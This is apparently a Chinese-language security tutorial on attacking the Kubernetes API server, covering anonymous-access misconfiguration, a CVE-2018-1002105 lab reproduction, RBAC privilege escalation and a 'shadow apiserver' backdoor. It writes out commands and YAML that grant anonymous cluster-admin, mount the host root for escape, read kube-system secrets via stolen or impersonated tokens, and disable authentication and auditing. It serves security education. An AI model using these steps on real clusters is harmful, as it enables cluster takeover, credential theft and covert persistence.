# apiserver简介

API Server 作为 K8s 集群的管理入口，在集群中被用于提供API来控制集群内部。默认情况下使用 8080 （insecure-port，非安全端口）和 6443 （secure-port，安全端口）端口，其中 8080 端口无需认证，6443端口需要认证且有 TLS 保护。

 **apiserver工作原理图** ：  
![1655556568-451522-image](https://image.3001.net/images/20220627/1656327558_62b98d8680b1873d80e75.png!small)

## 而apiserver在渗透测试过程中受到以下风险：

apiserver的`Insecure-port`端口对外暴露

apiserver未授权配置错误(`匿名访问+绑定高权限角色`)

历史apiserver提权漏洞(例如`CVE-2018-1002105`)

配置不当的RBAC受到的提权风险

apiserver权限维持

...

# 1.apiserver的`Insecure-port`端口对外暴露

API Server 作为 K8s 集群的管理入口，在集群中被用于提供API来控制集群内部。默认情况下使用 8080 （insecure-port，非安全端口）和 6443 （secure-port，安全端口）端口，其中 8080 端口无需认证，6443端口需要认证且有 TLS 保护。

如果其在生产环境中Insecure-port 被暴露出来，便利用此端口进行对集群的攻击。

但是这种情况很少了，条件必须是低版本（1.20版本后该选项已无效化）加配置中(`/etc/kubernets/manifests/kube-apiserver.yaml`)写了insecure-port选项,默认不开启：  
![1655556593-314332-image](https://image.3001.net/images/20220627/1656327559_62b98d876ca04dc01cc55.png!small)

# 2.apiserver未授权配置错误(`匿名访问+绑定高权限角色`)

Api server的 6443 （secure-port，安全端口）认证是需要凭据的。

![1655556607-354822-image](https://image.3001.net/images/20220627/1656327559_62b98d87de8c4ef090095.png!small)

如果配置错误，将system:anonymous用户绑定到了cluster-admin用户组，那么匿名用户可以支配集群。

    
    
    kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
    

![1655556637-32997-image](https://image.3001.net/images/20220627/1656327560_62b98d888f27189b0741c.png!small)

这种配置下可以拿到所有token后与api server交互，支配集群：  
![1655556651-174535-image](https://image.3001.net/images/20220627/1656327561_62b98d8956a83b937471b.png!small)

# 3.历史apiserver提权漏洞(例如`CVE-2018-1002105`)

CVE-2018-1002105是一个K8s提权漏洞，Kubernetes用户可以在已建立的API
Server连接上，打通了client到kubelet的通道，实现提升k8s普通用户到k8s api server的权限。

## 漏洞影响版本:

Kubernetes v1.0.x-1.9.x

Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11)

Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5)

Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3)

## 漏洞利用条件:

这边普通用户至少需要具有一个pod的exec/attach/portforward等权限。

 **环境：**

构造一个命名空间test，和一个test命名空间的pod，原有权限是对test命名空间下的pod的exec权限，漏洞利用后将权限提升为了API
Server权限，这里用metarget靶场起一个环境：

![1655556678-483297-image](https://image.3001.net/images/20220627/1656327562_62b98d8a57fe9f6e7c5be.png!small)

创建namespace:

    
    
    apiVersion: v1
    kind: Namespace
    metadata:
      name: test
    

创建role：

    
    
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      name: test
      namespace: test
    rules:
    - apiGroups:
      - ""
      resources:
      - pods
      verbs:
      - get
      - list
      - delete
      - watch
    - apiGroups:
      - ""
      resources:
      - pods/exec
      verbs:
      - create
      - get
    

创建role_binding.yml:

    
    
    apiVersion: rbac.authorization.k8s.io/v1
    kind: RoleBinding
    metadata:
      name: test
      namespace: test
    roleRef:
      apiGroup: rbac.authorization.k8s.io
      kind: Role
      name: test
    subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: test
    

创建pod：

    
    
    apiVersion: v1
    kind: Pod
    metadata:
      name: test
      namespace: test
    spec:
      containers:
      - name: ubuntu
        image: ubuntu:latest
        imagePullPolicy: IfNotPresent
        # Just spin & wait forever
        command: [ "/bin/bash", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      serviceAccount: default
      serviceAccountName: default
    

最后给用户配置一个静态的token文件来配置用户的认证：

当在命令行上指定`--token-auth-file=SOMEFILE`选项时，API server 从文件读取 bearer token。

token 文件是一个 csv 文件，每行至少包含三列：token、用户名、用户 uid：

    
    
    token,user,uid,"group1,group2,group3"
    

这里使用到的配置token：

    
    
    password,test,test,test
    

验证：

对指定test空间下的pod执行命令是可以的：

    
    
    kubectl --token=password --server=https://192.168.1.22:6443 --insecure-skip-tls-verify exec -it test -n test /bin/hostname
    

![1655556705-929449-image](https://image.3001.net/images/20220627/1656327563_62b98d8b9bb402a5387d7.png!small)

对其他命名空间越权操作发现提示权限不足：

    
    
    kubectl --token=password --server=https://192.168.1.22:6443 --insecure-skip-tls-verify get pods -n kube-system
    

![1655556723-500188-image](https://image.3001.net/images/20220627/1656327564_62b98d8c3c52b949b6ed5.png!small)

## 漏洞复现：

exp：<https://github.com/Metarget/cloud-native-security-book/blob/main/code/0403-CVE-2018-1002105/exploit.py>

exp中也是会创建一个挂载宿主机根目录的pod，实现容器逃，而创建的基础是利用前面说的高权限websocket连接，利用这个连接向apiserver发送命令，窃取高凭据文件，再利用凭据文件创建pod，挂载宿主机根目录。

挂载了以后读取宿主机节点的/etc/kubernetes/pki目录下的大量敏感凭据：  
![1655556743-80090-image](https://image.3001.net/images/20220627/1656327564_62b98d8ce7c05d9f41be0.png!small)

exp中指定读取的证书文件：  
![1655556759-361224-image](https://image.3001.net/images/20220627/1656327565_62b98d8df29a20935b8bd.png!small)

利用：  
![1655556779-612031-image](https://image.3001.net/images/20220627/1656327567_62b98d8f2b25ac9f5e5fe.png!small)

这样就拿到了凭据，最后就是创建pod挂载宿主机根目录：

    
    
    # attacker.yaml
    apiVersion: v1
    kind: Pod
    metadata:
      name: attacker
    spec:
      containers:
      - name: ubuntu
        image: ubuntu:latest
        imagePullPolicy: IfNotPresent
        # Just spin & wait forever
        command: [ "/bin/bash", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
        volumeMounts:
        - name: escape-host
          mountPath: /host-escape-door
      volumes:
        - name: escape-host
          hostPath:
            path: /
    

![1655556802-155029-image](https://image.3001.net/images/20220627/1656327568_62b98d904b363139ff232.png!small)

host-escape-door 目录为pod挂载宿主机的目录,发现已经可以查看apiserver宿主机的目录：  
![1655556815-332685-image](https://image.3001.net/images/20220627/1656327569_62b98d910b60f8205e6a4.png!small)

# 4.配置不当的RBAC受到的提权风险

### RBAC权限滥用提权

权限滥用主要在对特定资源有特定操作的情况下，可以有特定的权限提升。  
  

## 枚举当前RBAC权限

在指定当前通过渗透得到用户凭据或者sa的凭据后，可以先枚举当前有哪些权限：  
![](https://image.3001.net/images/20220627/1656327569_62b98d91e3504f7ba63d3.png!small)  
![](https://image.3001.net/images/20220627/1656327570_62b98d92761ce4a32920e.png!small)

也可以使用curl对apiserver的api进行访问来区别当前的权限:  
![](https://image.3001.net/images/20220627/1656327571_62b98d9352c46c3005d5d.png!small)

枚举之后应该对当前凭据对资源的操作有个数了，下面列举在分配权限时，哪些情况下有提权提升的可能。

## create pods权限

`resources: ["*"] verbs:
["create"]`：`resources`为*或者为`pods`的情况下，verbs是`create`，在集群中可以创建任意资源，比如像pods，roles.而创建pods的命名空间也取决你role中metadata.namespace的值：  
![](https://image.3001.net/images/20220627/1656327571_62b98d93dd6c852d35163.png!small)

如果有create权限，常见攻击手法就是创建挂载根目录的pod，跳到node：  
![](https://image.3001.net/images/20220627/1656327572_62b98d9472063b6fadece.png!small)

## list secrets权限

`resources: ["*"] verbs:
["list"]`：`resources`为*或者为`secrets`的情况下，verbs是`list`,在集群中可以列出其他user的secrets，一般拿来寻找特权账号凭据。

具有list权限或者说是list secrets权限的role可以列出集群中重要的secrets，包括管理的keys(JWT):  
![](https://image.3001.net/images/20220627/1656327572_62b98d94e913608ab8fd6.png!small)

利用：  
`curl -v -H "Authorization: Bearer <jwt_token>"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/`

## get secret权限

`resources: ["*"] verbs:
["get"]`:`resources`为*或者为`secrets`的情况下，verbs是`get`，get可以在集群中获得其他service
accounts的secrets。

如下定义Role的resources字段为*或者secrets对象，并且verbs为get，这时候有权限获得其他secrets。  
![](https://image.3001.net/images/20220627/1656327573_62b98d9576fbe4c0fdd0c.png!small)  
get权限能访问的api：

    
    
    GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
    

但是get和list不一样，get需要知道secrets的id才能读：  
![](https://image.3001.net/images/20220627/1656327574_62b98d962f35b49de2687.png!small)  
图出处：图出处，list和get来窃取凭据的区别：<https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf>

这时候用读secrets来攻击的话常见手法是读默认的sa的token,默认有这些sa:  
![](https://image.3001.net/images/20220627/1656327574_62b98d96a66cadf43d5f1.png!small)  
对应的token:

    
    
    kubectl -n kube-system get secret -n kube-system
    

![](https://image.3001.net/images/20220627/1656327575_62b98d9751d9f9be4c997.png!small)  
可以看到每个sa的token都是sa的`name-token-随机五个字符`,

其中随机的字符是由数字和字母组合，特定的27个字符：

<https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#183>：#  
![](https://image.3001.net/images/20220627/1656327576_62b98d98c377014cdde75.png!small)  
27的5次方也是14,348,907可能，写个py脚本的迭代器爆破即可：  
![](https://image.3001.net/images/20220627/1656327577_62b98d9954bd1dbe6b6c3.png!small)

## get list watch secrets权限

`resources: ["*"] verbs:
["get","list","watch"]`:resources字段为*或者secrets的话可以利用这三个权限，来创建一个恶意pod后通过挂载secrets以至获取别人的secrets，然后外带：  
![](https://image.3001.net/images/20220627/1656327578_62b98d9a3fda8aadc1ee6.png!small)  
![](https://image.3001.net/images/20220627/1656327579_62b98d9b0d0387ba0ff48.png!small)

这里使用`automountServiceAccountToken`将特权服务帐户的令牌挂载到
pod，使用令牌获取拿到所有secrets后用nc传到攻击者监听端口，当前也可以使用其他方式带外：  
![](https://image.3001.net/images/20220627/1656327579_62b98d9b8ab4f1a38a23e.png!small)  
图出处，创建一个"hot pod"来窃取凭据：<https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf>

## Impersonate权限

用户可以通过模拟标头充当另一个用户。这些让请求手动覆盖请求身份验证的用户信息。例如，管理员可以使用此功能通过临时模拟另一个用户并查看请求是否被拒绝来调试授权策略。

以下 HTTP 标头可用于执行模拟请求：

> `Impersonate-User`：要充当的用户名。
>
> `Impersonate-Group`：要充当的组名。可以多次提供设置多个组。可选的。需要“模拟用户”。
>
> `Impersonate-Extra-( extra name )`：用于将额外字段与用户关联的动态标题。可选的。需要“模拟用户”。
>
> `Impersonate-Uid`：代表被模拟用户的唯一标识符。可选的。需要“模拟用户”。Kubernetes 对此字符串没有任何格式要求。

有了`Impersonate`权限攻击者可以模拟一个有特权的账户或者组：  
Role:  
![](https://image.3001.net/images/20220627/1656327580_62b98d9c3347366dc3644.png!small)

binding:  
![](https://image.3001.net/images/20220627/1656327580_62b98d9cd8a9ceb73825f.png!small)

模拟用户的操作是通过调用K8s API 的Header来指定的，kubectl可以加入--as参数：

    
    
    kubectl --as <user-to-impersonate> ...
    kubectl --as <user-to-impersonate> --as-group <group-to-impersonate> ...
    

请求apiserver:

    
    
    curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
    -H "Impersonate-Group: system:masters"\ 
    -H "Impersonate-User: null" \
    -H "Accept: application/json" \
    https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
    

# 5.apiserver权限维持

在渗透权限维持阶段如果像常规对机器比如容器做权限维持的话，
是有弊端的，因为在K8s中会对pod进行扩容和缩容，权限维持的机器就会变得有生命周期而使已获得权限变得不稳定。所以在K8s中利用apiserver做权限维持是个不错的选择，

## shadow apiserver

shadow apiserver就是创建一种针对K8s集群的隐蔽持续控制通道，
在原有的apiserver上开放更大的权限并且放弃日志审计，从而达到隐蔽性和持久控制目的。

pdf：

> https://published-> prd.lanyonevents.com/published/rsaus20/sessionsFiles/18317/2020_USA20_CSV-F01_01_Advanced%20Persistence%20Threats%20The%20Future%20of%20Kubernetes%20Attacks.pdf

原本apiserver信息：

![1655556949-56559-image](https://image.3001.net/images/20220627/1656327581_62b98d9d7a47791a422ee.png!small)

apiserver pod的详细：

![1655556927-866990-image](https://image.3001.net/images/20220627/1656327582_62b98d9e96ff3246c0622.png!small)

构造shadow apiserver需要在原有的基础上增加功能,总所周知cdk工具可以一键部署shadow apiserver：

`pkg/exploit/k8s_shadow_apiserver.go`:

![1655556903-19457-image](https://image.3001.net/images/20220627/1656327583_62b98d9f85092b1050fda.png!small)

可以发现cdk在配置文件中添加：

    
    
    --allow-privileged
    --insecure-port=9443
    --insecure-bind-address=0.0.0.0
    --secure-port=9444
    --anonymous-auth=true
    --authorization-mode=AlwaysAllow
    

可以看到通过参数新启动的apiserver允许了容器请求特权模式，暴露了insecure-port为9443，监听地址绑定为0.0.0.0，允许了匿名访问，允许所有请求。

也可以修改cdk中原有配置的参数来定制你的后门apiserver。直接修改`argInsertReg.ReplaceAllString`函数里的内容即可。

ps ：

`insecure-port`的参数在最新cdk已经被注释了，这个参数在K8s 1.24会直接弃用。

所以这个时候当前可以匿名向apiserver访问请求管理集群，curl/kubectl去请求，

`kubectl -s 192.168.1.22:6443 get pods,deployment -o wide`  
![1655556887-262819-image](https://image.3001.net/images/20220627/1656327584_62b98da05b47038c62d9b.png!small)

# 6.最后

k8s API Server提供了k8s各类资源对象（pod,RC,Service等）的增删改查及watch等HTTP
Rest接口，是整个系统的数据总线和数据中心，充当了集群中不可或缺的一个角色，因此apiserver组件的安全以及基线检查工作对于集群来说尤为重要，在集群安全的角度对apiserver组件安全问题和风险也应该保持持续的关注。

